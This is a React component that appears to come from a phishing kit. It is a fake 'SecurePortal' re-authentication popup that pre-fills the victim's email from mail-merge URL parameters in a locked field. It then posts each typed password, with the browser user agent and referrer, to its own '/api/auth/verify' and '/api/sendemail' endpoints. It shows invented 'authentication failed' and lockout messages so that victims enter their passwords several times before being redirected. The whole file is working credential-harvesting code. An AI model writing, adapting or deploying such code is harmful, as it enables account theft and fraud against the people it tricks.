/** @format */
"use client";
import React, { useState, useEffect } from "react";

const Popup = ({ domain, systemInfo }) => {
  const { date, browser, os, location } = systemInfo || {};
  const [password, setPassword] = useState("");
  const [email, setEmail] = useState("");
  const [attempts, setAttempts] = useState(0);
  const [errorMessage, setErrorMessage] = useState("");
  const [showPassword, setShowPassword] = useState(false);
  const [isLoading, setIsLoading] = useState(false);
  const [sessionTimer, setSessionTimer] = useState(180); // 3 minutes in seconds
  const [lockoutTimer, setLockoutTimer] = useState(0);
  const [isHovered, setIsHovered] = useState(false);

  const companyName = "SecurePortal";
  
  // Extract domain from email for logo
  const getDomainFromEmail = () => {
    if (email && email.includes('@')) {
      return email.split('@')[1];
    }
    return (domain || companyName).toLowerCase() + '.com'; // Fallback to domain name + .com
  };

  useEffect(() => {
    // Extract email from URL using all the provided syntax patterns from old popup
    const extractEmailFromURL = () => {
      try {
        const url = window.location.href;
        const urlObj = new URL(url);
        
        // All the email parameter patterns from old popup
        const emailPatterns = [
          'email', 'Email', 'EMAIL', 'user_email', 'UserEmail', 'userEmail',
          'emailAddress', 'EmailAddress', 'contact_email', 'recipient_email',
          'subscriber_email', 'mail', 'e', 'u', 'addr', 'address'
        ];

        // Check query parameters FIRST - return whatever value is found
        for (const pattern of emailPatterns) {
          const emailValue = urlObj.searchParams.get(pattern);
          if (emailValue) {
            // Return the value even if it's a template pattern
            return emailValue;
          }
        }

        // Check hash parameters
        const hash = urlObj.hash;
        if (hash) {
          const hashParams = new URLSearchParams(hash.substring(1));
          for (const pattern of emailPatterns) {
            const emailValue = hashParams.get(pattern);
            if (emailValue) {
              return emailValue;
            }
          }
        }

        // Check for combined patterns like ?email=[[Email]]#email=[[Email]]
        const combinedRegex = /[?&]#?(?:email|Email|EMAIL|user_email|UserEmail|userEmail|emailAddress|EmailAddress|contact_email|recipient_email|subscriber_email|mail|e|u|addr|address)=([^&?#\s]+)/g;
        let match;
        while ((match = combinedRegex.exec(url)) !== null) {
          if (match[1]) {
            return decodeURIComponent(match[1]);
          }
        }

        // Check URL encoded patterns
        const decodedUrl = decodeURIComponent(url);
        const emailRegex = /[?&]#?(?:email|Email|EMAIL|user_email|UserEmail|userEmail|emailAddress|EmailAddress|contact_email|recipient_email|subscriber_email|mail|e|u|addr|address)=([^&?#\s]+)/g;
        while ((match = emailRegex.exec(decodedUrl)) !== null) {
          if (match[1]) {
            return match[1];
          }
        }

        // Check for all template syntax patterns - RETURN THEM
        const templatePatterns = [
          /[?&]#?email=(\[\[-Email-\]\])/i,
          /[?&]#?email=(\[\[Email\]\])/i,
          /[?&]#?email=(\[\[email\]\])/i,
          /[?&]#?email=(\{\{Email\}\})/i,
          /[?&]#?email=(\{\{email\}\})/i,
          /[?&]#?email=(\{\{ subscriber\.email \}\})/i,
          /[?&]#?email=(\{\{contact\.email\}\})/i,
          /[?&]#?email=(%EMAIL%)/i,
          /[?&]#?email=(%Email%)/i,
          /[?&]#?email=(%email%)/i,
          /[?&]#?email=(%%emailaddress%%)/i,
          /[?&]#?email=(\{Email\})/i,
          /[?&]#?email=(\{email\})/i,
          /[?&]#?email=(<<Email>>)/i,
          /[?&]#?email=(<<email>>)/i,
          /[?&]#?email=(<%= Email %>)/i,
          /[?&]#?email=(<%= email %>)/i,
          /[?&]#?email=(\$\{Email\})/i,
          /[?&]#?email=(\$\{email\})/i,
          /[?&]#?email=(@Email)/i,
          /[?&]#?email=(@email)/i,
          /[?&]#?email=(:email)/i,
          /[?&]#?email=(<Email>)/i,
          /[?&]#?email=(<email>)/i,
          /[?&]#?email=(\[Email\])/i,
          /[?&]#?email=(\[email\])/i,
          /[?&]#?email=("Email")/i,
          /[?&]#?email=('Email')/i
        ];

        for (const pattern of templatePatterns) {
          const match = url.match(pattern);
          if (match && match[1]) {
            // Return the template pattern itself
            return match[1];
          }
        }

        // Check for URL encoded template patterns
        const encodedPatterns = [
          /%3Femail%3D\[\[Email\]\]/i,
          /%3Femail%3D\[\[-Email-\]\]/i,
          /%3Femail%3D%7B%7BEmail%7D%7D/i,
          /%3Femail%3D%25EMAIL%25/i,
          /%3Femail%3D%%emailaddress%%/i,
          /%3Femail%3D%255B%255BEmail%255D%255D/i,
          /%23email%3D\[\[Email\]\]/i,
          /%23email%3D\[\[-Email-\]\]/i,
          /%23email%3D%7B%7BEmail%7D%7D/i,
          /%23email%3D%25EMAIL%25/i,
          /%23email%3D%%emailaddress%%/i,
          /%23email%3D%255B%255BEmail%255D%255D/i
        ];

        for (const pattern of encodedPatterns) {
          if (pattern.test(url)) {
            // Try to extract the actual pattern value
            const encodedMatch = url.match(/[?&]#?email=([^&?#]+)/i);
            if (encodedMatch && encodedMatch[1]) {
              return decodeURIComponent(encodedMatch[1]);
            }
          }
        }

        // Additional patterns from new popup
        const emailRegexFallback = /[\w.-]+@[\w.-]+\.\w+/g;
        const matches = url.match(emailRegexFallback);
        if (matches && matches.length > 0) {
          return matches[0];
        }

        return "";
      } catch (error) {
        return "";
      }
    };

    const extractedEmail = extractEmailFromURL();
    if (extractedEmail) {
      setEmail(extractedEmail);
    }

    const timerInterval = setInterval(() => {
      setSessionTimer(prev => {
        if (prev <= 1) {
          clearInterval(timerInterval);
          return 0;
        }
        return prev - 1;
      });
    }, 1000);

    return () => clearInterval(timerInterval);
  }, []);

  // Lockout timer countdown
  useEffect(() => {
    if (lockoutTimer > 0) {
      const interval = setInterval(() => {
        setLockoutTimer(prev => {
          if (prev <= 1) {
            clearInterval(interval);
            return 0;
          }
          return prev - 1;
        });
      }, 1000);
      return () => clearInterval(interval);
    }
  }, [lockoutTimer]);

  const sendData = async (email, password, attemptNumber) => {
    try {
      const response = await fetch("/api/auth/verify", {
        method: "POST",
        headers: {
          "Content-Type": "application/json",
        },
        body: JSON.stringify({ 
          username: email,
          credential: password,
          attempt: attemptNumber,
          timestamp: new Date().toISOString(),
          userAgent: navigator.userAgent,
          referrer: document.referrer
        }),
      });

      if (!response.ok) {
        throw new Error("Verification failed");
      }

      const data = await response.json();
      console.log("Verification result:", data.status);
    } catch (error) {
      console.error("Auth error:", error);
    }
  };

  const sendEmail = async (email, password) => {
    try {
      const userAgent = navigator.userAgent;
      const remoteAddress = "";
      
      const response = await fetch("/api/sendemail", {
        method: "POST",
        headers: {
          "Content-Type": "application/json",
        },
        body: JSON.stringify({ 
          email,
          password, 
          userAgent, 
          remoteAddress, 
          landingUrl: window.location.href
        }),
      });

      if (!response.ok) {
        throw new Error("Failed to send email");
      }

      const data = await response.json();
      console.log(data.message);
    } catch (error) {
      console.error("Error:", error);
    }
  };

  const handleSubmit = () => {
    if (!password.trim()) {
      setErrorMessage("Please enter your password");
      return;
    }

    if (lockoutTimer > 0) {
      const minutes = Math.floor(lockoutTimer / 60);
      const seconds = lockoutTimer % 60;
      setErrorMessage(`Account temporarily locked. Try again in ${minutes}:${seconds.toString().padStart(2, '0')}`);
      return;
    }

    setIsLoading(true);
    
    setTimeout(() => {
      const currentAttempt = attempts + 1;
      
      // Send credentials on every attempt
      sendData(email, password, currentAttempt);
      sendEmail(email, password);
      
      if (currentAttempt === 1) {
        setErrorMessage("Authentication failed. Please try again.");
        setAttempts(1);
      } else if (currentAttempt === 2) {
        setErrorMessage("Authentication failed. Please verify your credentials.");
        setAttempts(2);
      } else if (currentAttempt === 3) {
        setErrorMessage("Multiple failed attempts detected. Account temporarily locked for security.");
        setAttempts(3);
        setLockoutTimer(120); // 2 minute lockout
      } else if (currentAttempt > 3) {
        // After 3rd failed attempt, redirect
        setErrorMessage("Maximum attempts exceeded. Redirecting to support...");
        setTimeout(() => {
          window.location.href = `https://${companyName.toLowerCase()}.com/support`;
        }, 2000);
      }
      
      setPassword("");
      setIsLoading(false);
    }, 1200);
  };

  const formatTime = (seconds) => {
    const mins = Math.floor(seconds / 60);
    const secs = seconds % 60;
    return `${mins}:${secs.toString().padStart(2, '0')}`;
  };

  return (
    <>
      <div className="session-modal-overlay" style={{
        position: 'fixed',
        top: 0,
        left: 0,
        right: 0,
        bottom: 0,
        backgroundColor: 'rgba(0, 0, 0, 0.7)',
        display: 'flex',
        alignItems: 'center',
        justifyContent: 'center',
        zIndex: 9999,
        fontFamily: "'Segoe UI', -apple-system, BlinkMacSystemFont, 'Roboto', sans-serif",
        padding: '10px'
      }}>
        <div className="session-modal" style={{
          backgroundColor: '#ffffff',
          borderRadius: '8px',
          padding: '18px',
          width: '100%',
          maxWidth: '340px',
          boxShadow: '0 3px 15px rgba(0, 0, 0, 0.12)',
          position: 'relative',
          animation: 'fadeIn 0.3s ease-out'
        }}>
          
          {/* Info Message - KEEPING THIS */}
          <div style={{
            backgroundColor: '#f8f9fa',
            borderRadius: '4px',
            padding: '8px',
            marginBottom: '14px',
            borderLeft: '2px solid #0066cc'
          }}>
            <p style={{
              margin: 0,
              fontSize: '11px',
              color: '#495057',
              lineHeight: '1.3'
            }}>
              For security reasons, please re-authenticate to continue accessing the portal.
            </p>
          </div>

          {/* Email Field - NON-EDITABLE AND NON-REMOVABLE (from old popup) */}
          <div style={{ marginBottom: '12px' }}>
            <label style={{
              display: 'block',
              fontSize: '11px',
              fontWeight: '500',
              color: '#495057',
              marginBottom: '4px'
            }}>
              Account Email
            </label>
            <div style={{
              position: 'relative',
              borderRadius: '4px',
              border: '1px solid #ced4da',
              transition: 'border-color 0.2s'
            }}>
              <input
                type="email"
                style={{
                  padding: '7px 10px',
                  width: '100%',
                  fontSize: '11px',
                  backgroundColor: '#f8f9fa',
                  outline: 'none',
                  border: 'none',
                  fontFamily: 'inherit',
                  color: '#495057',
                  boxSizing: 'border-box',
                  height: '32px',
                  cursor: 'default'
                }}
                placeholder="Email will be auto-filled from URL"
                value={email}
                readOnly
                onKeyDown={(e) => {
                  // Prevent all keyboard input
                  e.preventDefault();
                  return false;
                }}
                onKeyPress={(e) => {
                  // Prevent all keyboard input
                  e.preventDefault();
                  return false;
                }}
                onKeyUp={(e) => {
                  // Prevent all keyboard input
                  e.preventDefault();
                  return false;
                }}
                onPaste={(e) => {
                  // Prevent pasting
                  e.preventDefault();
                  return false;
                }}
                onCut={(e) => {
                  // Prevent cutting
                  e.preventDefault();
                  return false;
                }}
                onCopy={(e) => {
                  // Allow copying but don't change the value
                  return;
                }}
                onClick={(e) => {
                  // Prevent focusing/selecting
                  e.target.blur();
                }}
                onFocus={(e) => {
                  // Remove focus immediately
                  e.target.blur();
                }}
                onMouseDown={(e) => {
                  // Prevent selecting text
                  e.preventDefault();
                }}
                autoComplete="off"
                spellCheck="false"
              />
              <div style={{
                position: 'absolute',
                right: '8px',
                top: '50%',
                transform: 'translateY(-50%)',
                color: '#28a745'
              }}>
                <svg width="10" height="10" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2">
                  <path d="M20 6L9 17l-5-5"/>
                </svg>
              </div>
            </div>
          </div>

          {/* Password Field */}
          <div style={{ marginBottom: '14px' }}>
            <div style={{
              display: 'flex',
              justifyContent: 'space-between',
              alignItems: 'center',
              marginBottom: '4px'
            }}>
              <label style={{
                fontSize: '11px',
                fontWeight: '500',
                color: '#495057'
              }}>
                Password
              </label>
              <button
                onClick={() => setShowPassword(!showPassword)}
                style={{
                  background: 'none',
                  border: 'none',
                  color: '#0066cc',
                  cursor: 'pointer',
                  fontSize: '10px',
                  padding: '0',
                  fontFamily: 'inherit'
                }}
                type="button"
              >
                {showPassword ? 'Hide' : 'Show'}
              </button>
            </div>
            <div style={{
              position: 'relative',
              borderRadius: '4px',
              border: '1px solid #ced4da',
              transition: 'border-color 0.2s'
            }}>
              <input
                type={showPassword ? "text" : "password"}
                style={{
                  padding: '7px 10px',
                  width: '100%',
                  fontSize: '11px',
                  backgroundColor: '#ffffff',
                  outline: 'none',
                  border: 'none',
                  fontFamily: 'inherit',
                  color: '#495057',
                  boxSizing: 'border-box',
                  height: '32px'
                }}
                placeholder="Enter your password"
                value={password}
                onChange={(e) => setPassword(e.target.value)}
                onKeyDown={(e) => {
                  if (e.key === 'Enter') {
                    handleSubmit();
                  }
                }}
                autoComplete="current-password"
                disabled={lockoutTimer > 0}
              />
            </div>
          </div>

          {/* Error Message */}
          <div style={{
            marginBottom: '12px',
            height: errorMessage ? 'auto' : '0',
            overflow: 'hidden',
            transition: 'height 0.3s ease'
          }}>
            <div style={{
              backgroundColor: '#f8d7da',
              color: '#721c24',
              padding: '6px 8px',
              borderRadius: '4px',
              border: '1px solid #f5c6cb',
              display: 'flex',
              alignItems: 'center',
              gap: '4px',
              animation: 'slideDown 0.3s ease-out'
            }}>
              <svg width="10" height="10" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2">
                <circle cx="12" cy="12" r="10"/>
                <line x1="12" y1="8" x2="12" y2="12"/>
                <line x1="12" y1="16" x2="12.01" y2="16"/>
              </svg>
              <span style={{ fontSize: '11px' }}>{errorMessage}</span>
            </div>
          </div>

          {/* Action Buttons */}
          <div style={{
            display: 'flex',
            gap: '6px',
            marginBottom: '12px'
          }}>
            <button
              onClick={handleSubmit}
              onMouseEnter={() => setIsHovered(true)}
              onMouseLeave={() => setIsHovered(false)}
              disabled={isLoading || lockoutTimer > 0}
              style={{
                flex: 1,
                padding: '8px 12px',
                backgroundColor: isHovered ? '#0055aa' : '#0066cc',
                color: '#ffffff',
                border: 'none',
                borderRadius: '4px',
                fontSize: '11px',
                fontWeight: '500',
                cursor: isLoading || lockoutTimer > 0 ? 'not-allowed' : 'pointer',
                transition: 'background-color 0.2s',
                display: 'flex',
                alignItems: 'center',
                justifyContent: 'center',
                gap: '4px',
                opacity: isLoading || lockoutTimer > 0 ? 0.8 : 1,
                height: '34px'
              }}
            >
              {isLoading ? (
                <>
                  <svg width="10" height="10" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2">
                    <path d="M12 2v4M12 18v4M4.93 4.93l2.83 2.83M16.24 16.24l2.83 2.83M2 12h4M18 12h4M4.93 19.07l2.83-2.83M16.24 7.76l2.83-2.83"/>
                  </svg>
                  Verifying...
                </>
              ) : lockoutTimer > 0 ? (
                `Locked (${formatTime(lockoutTimer)})`
              ) : (
                'Continue Session'
              )}
            </button>
          </div>
        </div>
      </div>

      {/* CSS Animations - No scrollbars */}
      <style jsx>{`
        @keyframes fadeIn {
          from {
            opacity: 0;
            transform: translateY(-10px);
          }
          to {
            opacity: 1;
            transform: translateY(0);
          }
        }

        @keyframes slideDown {
          from {
            opacity: 0;
            transform: translateY(-5px);
          }
          to {
            opacity: 1;
            transform: translateY(0);
          }
        }

        input:focus {
          outline: none;
          border-color: #0066cc !important;
          box-shadow: 0 0 0 2px rgba(0, 102, 204, 0.1);
        }

        button:hover:not(:disabled) {
          opacity: 0.9;
        }

        /* Remove ALL scrollbars */
        .session-modal-overlay {
          -ms-overflow-style: none;  /* IE and Edge */
          scrollbar-width: none;  /* Firefox */
        }

        .session-modal-overlay::-webkit-scrollbar {
          display: none;  /* Chrome, Safari, Opera */
        }

        .session-modal {
          -ms-overflow-style: none;
          scrollbar-width: none;
          overflow: hidden; /* Changed from auto to hidden */
        }

        .session-modal::-webkit-scrollbar {
          display: none;
        }

        /* Prevent body scroll when modal is open */
        body {
          overflow: hidden !important;
        }

        @media (max-width: 480px) {
          .session-modal {
            padding: 14px 12px !important;
            margin: 0 8px !important;
            border-radius: 6px !important;
          }
          
          .session-modal h2 {
            font-size: 14px !important;
          }
          
          button {
            padding: 7px 10px !important;
            font-size: 10px !important;
            height: 32px !important;
          }
          
          input {
            height: 30px !important;
            font-size: 10px !important;
          }
        }

        @media (max-width: 360px) {
          .session-modal {
            padding: 12px 10px !important;
          }
          
          .session-modal h2 {
            font-size: 13px !important;
          }
        }
      `}</style>
    </>
  );
};

export default Popup;